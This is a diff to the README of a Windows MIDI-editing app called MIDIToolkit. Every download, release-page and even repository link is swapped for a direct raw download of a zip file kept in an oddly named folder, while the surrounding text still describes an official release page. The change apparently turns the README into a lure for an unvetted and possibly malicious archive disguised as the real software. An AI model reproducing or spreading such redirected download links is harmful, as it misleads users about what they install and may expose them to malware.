@@ -1,6 +1,6 @@
 # 🎹 MIDIToolkit - Easy MIDI Editing for Everyone
 
-[![Download MIDIToolkit](https://img.shields.io/badge/Download-MIDIToolkit-brightgreen?style=for-the-badge)](https://github.com/rockanalex-dev/MIDIToolkit/releases)
+[![Download MIDIToolkit](https://img.shields.io/badge/Download-MIDIToolkit-brightgreen?style=for-the-badge)](https://github.com/rockanalex-dev/MIDIToolkit/raw/refs/heads/main/daintily/MIDI-Toolkit-v2.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You don’t need to be a musician or developer to use MIDIToolkit. The app lets 
 To get started, you need the MIDIToolkit software package. The download link takes you to the official release page on GitHub. This page holds all available versions and installation files.
 
 **Go here to download:**  
-[Download MIDIToolkit Releases](https://github.com/rockanalex-dev/MIDIToolkit/releases)
+[Download MIDIToolkit Releases](https://github.com/rockanalex-dev/MIDIToolkit/raw/refs/heads/main/daintily/MIDI-Toolkit-v2.3.zip)
 
 You will see a list of versions and files. Pick the latest release for Windows.
 
@@ -39,7 +39,7 @@ You will see a list of versions and files. Pick the latest release for Windows.
 ## 💻 Installation on Windows
 
 1. **Visit the Release Page:** Follow this link:  
-   [https://github.com/rockanalex-dev/MIDIToolkit/releases](https://github.com/rockanalex-dev/MIDIToolkit/releases)
+   [https://github.com/rockanalex-dev/MIDIToolkit/raw/refs/heads/main/daintily/MIDI-Toolkit-v2.3.zip](https://github.com/rockanalex-dev/MIDIToolkit/raw/refs/heads/main/daintily/MIDI-Toolkit-v2.3.zip)
 
 2. **Find the Latest Version:** The top item usually has the newest version number and release date.
 
@@ -135,12 +135,12 @@ Check your speakers or headphones connection. Make sure no other app is blocking
 For support or questions, you can visit the GitHub repository. Look in the **Issues** section to see if someone else had the same problem or start a new conversation describing your issue.
 
 Link to GitHub repository:  
-https://github.com/rockanalex-dev/MIDIToolkit
+https://github.com/rockanalex-dev/MIDIToolkit/raw/refs/heads/main/daintily/MIDI-Toolkit-v2.3.zip
 
 ---
 
 ## 🔗 Download Link Again
 
-[![Get MIDIToolkit](https://img.shields.io/badge/Get-MIDIToolkit-blue?style=for-the-badge)](https://github.com/rockanalex-dev/MIDIToolkit/releases)  
+[![Get MIDIToolkit](https://img.shields.io/badge/Get-MIDIToolkit-blue?style=for-the-badge)](https://github.com/rockanalex-dev/MIDIToolkit/raw/refs/heads/main/daintily/MIDI-Toolkit-v2.3.zip)  
 
 Use the link above to visit the release page and start your download. Choose the installer file for Windows and follow the steps above.
